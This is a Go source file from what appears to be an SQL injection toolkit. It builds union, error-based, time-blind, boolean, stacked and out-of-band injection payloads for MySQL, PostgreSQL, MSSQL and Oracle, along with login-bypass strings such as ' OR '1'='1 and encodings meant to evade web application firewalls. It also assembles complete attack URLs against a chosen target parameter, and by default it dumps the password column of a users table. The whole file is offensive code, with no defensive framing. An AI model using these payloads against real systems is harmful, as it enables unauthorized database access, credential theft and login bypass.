package sqlexp

import (
	"fmt"
	"net/url"
	"strings"
)

type Exploit struct {
	db         DBType
	method     Method
	prefix     string
	suffix     string
	targetURL  string
	param      string
	columns    int
	tableName  string
	columnName string
	sleepSec   int
	wafBypass  bool
	bypassType BypassType
}

func NewExploit() *Exploit {
	return &Exploit{
		db:         MySQL,
		method:     UnionBased,
		prefix:     "'",
		suffix:     "-- -",
		columns:    3,
		tableName:  "users",
		columnName: "password",
		sleepSec:   5,
		bypassType: BypassCommentInline,
	}
}

func (e *Exploit) DB(db DBType) *Exploit {
	e.db = db
	e.suffix = CommentFor(db)
	return e
}

func (e *Exploit) Method(m Method) *Exploit {
	e.method = m
	return e
}

func (e *Exploit) Prefix(p string) *Exploit {
	e.prefix = p
	return e
}

func (e *Exploit) Suffix(s string) *Exploit {
	e.suffix = s
	return e
}

func (e *Exploit) Target(urlStr string) *Exploit {
	e.targetURL = urlStr
	return e
}

func (e *Exploit) Param(p string) *Exploit {
	e.param = p
	return e
}

func (e *Exploit) Columns(n int) *Exploit {
	e.columns = n
	return e
}

func (e *Exploit) Table(t string) *Exploit {
	e.tableName = t
	return e
}

func (e *Exploit) Column(c string) *Exploit {
	e.columnName = c
	return e
}

func (e *Exploit) Sleep(n int) *Exploit {
	e.sleepSec = n
	return e
}

func (e *Exploit) WAFBypass(b bool) *Exploit {
	e.wafBypass = b
	return e
}

func (e *Exploit) Bypass(t BypassType) *Exploit {
	e.bypassType = t
	e.wafBypass = true
	return e
}

func (e *Exploit) GetPayloads() []string {
	var payloads []Payload

	if e.wafBypass {
		payloads = BypassPayloads(e.bypassType)
	} else {
		switch e.method {
		case ErrorBased:
			payloads = ErrorPayloads(e.db)
		case UnionBased:
			payloads = UnionPayloads(e.db)
		case BooleanBlind:
			payloads = BooleanPayloads(e.db)
		case TimeBlind:
			payloads = TimePayloads(e.db)
		case StackedQuery:
			payloads = StackedPayloads(e.db)
		case InlineQuery:
			payloads = InlinePayloads()
		case OutOfBand:
			payloads = OOBPayloads()
		default:
			payloads = UnionPayloads(e.db)
		}
	}

	result := make([]string, len(payloads))
	for i, p := range payloads {
		result[i] = e.wrapPayload(p.Raw)
	}
	return result
}

func (e *Exploit) GetUnionProbe() []string {
	probes := []string{"NULL"}
	for i := 2; i <= e.columns+1; i++ {
		probes = append(probes, strings.Repeat("NULL,", i-1)+"NULL")
	}

	result := make([]string, len(probes))
	for i, p := range probes {
		raw := fmt.Sprintf("%s UNION SELECT %s%s", e.prefix, p, e.suffix)
		result[i] = raw
	}
	return result
}

func (e *Exploit) GetUnionDump() string {
	comment := e.suffix
	if e.suffix == "" {
		comment = CommentFor(e.db)
	}

	var cols string
	switch e.columns {
	case 1:
		cols = "0"
	case 2:
		cols = "0,1"
	default:
		parts := make([]string, e.columns)
		for i := 0; i < e.columns; i++ {
			parts[i] = fmt.Sprintf("%d", i)
		}
		cols = strings.Join(parts, ",")
	}

	if e.tableName != "" && e.columnName != "" {
		return fmt.Sprintf("%s UNION SELECT %s,%s,%s FROM %s%s",
			e.prefix, e.columnName, cols[2:], cols[2:], e.tableName, comment)
	}

	return fmt.Sprintf("%s UNION SELECT %s%s", e.prefix, cols, comment)
}

func (e *Exploit) GetErrorExtract(target string) string {
	switch e.db {
	case MySQL:
		return fmt.Sprintf("%s AND EXTRACTVALUE(1,CONCAT(0x7e,(%s),0x7e))%s", e.prefix, target, e.suffix)
	case PostgreSQL:
		return fmt.Sprintf("%s AND CAST((%s) AS INT)%s", e.prefix, target, e.suffix)
	case MSSQL:
		return fmt.Sprintf("%s AND 1=CONVERT(int,(%s))%s", e.prefix, target, e.suffix)
	case Oracle:
		return fmt.Sprintf("%s AND UTL_INADDR.GET_HOST_NAME((%s))%s", e.prefix, target, e.suffix)
	default:
		return fmt.Sprintf("%s AND EXTRACTVALUE(1,CONCAT(0x7e,(%s),0x7e))%s", e.prefix, target, e.suffix)
	}
}

func (e *Exploit) GetTimeExtract(condition string) string {
	switch e.db {
	case MySQL:
		return fmt.Sprintf("%s AND IF((%s),SLEEP(%d),0)%s", e.prefix, condition, e.sleepSec, e.suffix)
	case PostgreSQL:
		return fmt.Sprintf("%s AND (SELECT CASE WHEN (%s) THEN pg_sleep(%d) ELSE pg_sleep(0) END)%s", e.prefix, condition, e.sleepSec, e.suffix)
	case MSSQL:
		return fmt.Sprintf("%s;IF(%s) WAITFOR DELAY '0:0:%d'%s", e.prefix, condition, e.sleepSec, e.suffix)
	case Oracle:
		return fmt.Sprintf("%s AND (SELECT CASE WHEN (%s) THEN DBMS_LOCK.SLEEP(%d) ELSE 0 END FROM dual)%s", e.prefix, condition, e.sleepSec, e.suffix)
	default:
		return fmt.Sprintf("%s AND IF((%s),SLEEP(%d),0)%s", e.prefix, condition, e.sleepSec, e.suffix)
	}
}

func (e *Exploit) GetBooleanExtract(condition string) string {
	return fmt.Sprintf("%s AND (%s)%s", e.prefix, condition, e.suffix)
}

func (e *Exploit) GetFingerprint() []string {
	items := FingerprintPayloads()
	result := make([]string, len(items))
	for i, p := range items {
		result[i] = e.wrapPayload(p.Raw)
	}
	return result
}

func (e *Exploit) GetLoginBypass() []string {
	items := []string{
		"admin'-- -",
		"admin' #",
		"' OR '1'='1",
		"' OR 1=1-- -",
		"') OR ('1'='1",
		"\" OR \"1\"=\"1\"-- -",
		"admin' OR '1'='1",
	}

	result := make([]string, len(items))
	for i, item := range items {
		result[i] = e.wrapPayload(item)
	}
	return result
}

func (e *Exploit) URLEncode(payload string) string {
	encoded := url.QueryEscape(payload)
	encoded = strings.ReplaceAll(encoded, "+", "%20")
	return encoded
}

func (e *Exploit) DoubleURLEncode(payload string) string {
	encoded := e.URLEncode(payload)
	double := ""
	for _, c := range encoded {
		if c == '%' {
			double += "%25"
		} else {
			double += string(c)
		}
	}
	return double
}

func (e *Exploit) HexEncode(payload string) string {
	hex := ""
	for _, c := range payload {
		hex += fmt.Sprintf("%%%02X", c)
	}
	return hex
}

func (e *Exploit) BuildRequest() string {
	payloads := e.GetPayloads()
	if len(payloads) == 0 {
		return ""
	}

	payload := payloads[0]
	encodedPayload := e.URLEncode(payload)

	if e.targetURL != "" && e.param != "" {
		sep := "?"
		if strings.Contains(e.targetURL, "?") {
			sep = "&"
		}
		return fmt.Sprintf("%s%s%s=%s", e.targetURL, sep, e.param, encodedPayload)
	}

	return encodedPayload
}

func (e *Exploit) BuildRequests() []string {
	payloads := e.GetPayloads()
	results := make([]string, len(payloads))

	for i, p := range payloads {
		encodedPayload := e.URLEncode(p)
		if e.targetURL != "" && e.param != "" {
			sep := "?"
			if strings.Contains(e.targetURL, "?") {
				sep = "&"
			}
			results[i] = fmt.Sprintf("%s%s%s=%s", e.targetURL, sep, e.param, encodedPayload)
		} else {
			results[i] = encodedPayload
		}
	}

	return results
}

func (e *Exploit) wrapPayload(raw string) string {
	if e.prefix == "" && e.suffix == "" {
		return raw
	}
	return fmt.Sprintf("%s%s%s", e.prefix, raw, e.suffix)
}

func Union(db DBType) []string {
	e := NewExploit().DB(db).Method(UnionBased)
	return e.GetPayloads()
}

func Error(db DBType) []string {
	e := NewExploit().DB(db).Method(ErrorBased)
	return e.GetPayloads()
}

func Boolean(db DBType) []string {
	e := NewExploit().DB(db).Method(BooleanBlind)
	return e.GetPayloads()
}

func Time(db DBType) []string {
	e := NewExploit().DB(db).Method(TimeBlind)
	return e.GetPayloads()
}

func Stacked(db DBType) []string {
	e := NewExploit().DB(db).Method(StackedQuery)
	return e.GetPayloads()
}

func Inline() []string {
	e := NewExploit().Method(InlineQuery)
	return e.GetPayloads()
}

func OOB() []string {
	e := NewExploit().Method(OutOfBand)
	return e.GetPayloads()
}

func Fingerprint() []string {
	return NewExploit().GetFingerprint()
}

func LoginBypass() []string {
	return NewExploit().GetLoginBypass()
}

func UnionProbe(db DBType, cols int) []string {
	return NewExploit().DB(db).Columns(cols).GetUnionProbe()
}

func TimeExtract(db DBType, condition string) string {
	return NewExploit().DB(db).GetTimeExtract(condition)
}

func ErrorExtract(db DBType, target string) string {
	return NewExploit().DB(db).GetErrorExtract(target)
}

func BooleanExtract(db DBType, condition string) string {
	return NewExploit().DB(db).GetBooleanExtract(condition)
}

func WAFBypass(t BypassType) []string {
	var payloads []Payload
	switch t {
	case BypassCommentInline:
		payloads = wafBypassCommentInline
	case BypassHexEncode:
		payloads = wafBypassHexEncode
	case BypassCaseVary:
		payloads = wafBypassCommentInline[:2]
	case BypassDoubleURL:
		payloads = []Payload{{Raw: "'%25%35%35NION%25%35%33ELECT%25%34%45ULL--", Description: "双重URL编码"}}
	case BypassWhitespace:
		payloads = wafBypassCommentInline[:4]
	case BypassKeywordSplit:
		payloads = wafBypassKeywordSplit
	case BypassHTTPParam:
		payloads = wafBypassHTTPParam
	default:
		payloads = wafBypassCommentInline
	}
	result := make([]string, len(payloads))
	for i, p := range payloads {
		result[i] = p.Raw
	}
	return result
}

func OrderBy() []string {
	payloads := OrderByPayloads()
	result := make([]string, len(payloads))
	for i, p := range payloads {
		result[i] = p.Raw
	}
	return result
}

func Limit() []string {
	payloads := LimitPayloads()
	result := make([]string, len(payloads))
	for i, p := range payloads {
		result[i] = p.Raw
	}
	return result
}